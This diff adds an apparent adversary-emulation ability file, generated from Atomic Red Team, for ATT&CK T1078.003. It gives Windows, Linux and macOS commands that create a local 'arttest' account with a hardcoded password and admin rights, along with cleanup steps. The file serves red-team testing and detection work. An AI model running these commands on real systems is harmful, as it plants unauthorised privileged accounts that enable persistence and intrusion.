@@ -1,0 +1,44 @@
+- id: 5d0e5dbb-21a4-4dcf-9dcd-90d9650e4705
+  name: Create local account with admin privileges (Generated from Atomic Red Team)
+  description: |
+    Ability for Valid Accounts: Local Accounts (ATT&CK T1078.003).
+    Creates a new local account with elevated privileges.
+    Generated from Atomic Red Team procedures (a524ce99-86de-4db6-b4f9-e08f35a47a15, 
+    f1275566-1c26-4b66-83e3-7f9f7f964daa, 02a91c34-8a5b-4bed-87af-501103eb5357);
+    review and test safely before use.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1078.003
+    name: 'Valid Accounts: Local Accounts'
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net user arttest /add &&
+          net user arttest 4RTisCool!321 &&
+          net localgroup administrators arttest /add
+        cleanup: |
+          net localgroup administrators arttest /delete &
+          net user arttest /delete
+    linux:
+      sh:
+        command: |
+          password=$(openssl passwd -1 "4RTisCool!321");
+          ([ "$(uname)" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password arttest) || (pw useradd arttest -g wheel -s /bin/sh && (echo $password | pw mod user arttest -h 0));
+          su arttest -c "whoami; exit"
+        cleanup: |
+          [ "$(uname)" = 'Linux' ] && userdel arttest -rf || rmuser -y arttest
+    darwin:
+      sh:
+        command: |
+          dscl . -create /Users/arttest;
+          dscl . -create /Users/arttest UserShell /bin/bash;
+          dscl . -create /Users/arttest RealName "Art Test";
+          dscl . -create /Users/arttest UniqueID 503;
+          dscl . -create /Users/arttest PrimaryGroupID 503;
+          dscl . -create /Users/arttest NFSHomeDirectory /Local/Users/arttest;
+          dscl . -passwd /Users/arttest 4RTisCool!321;
+          dscl . -append /Groups/admin GroupMembership arttest;
+        cleanup: |
+          sudo dscl . -delete /Users/arttest
+  privilege: Elevated
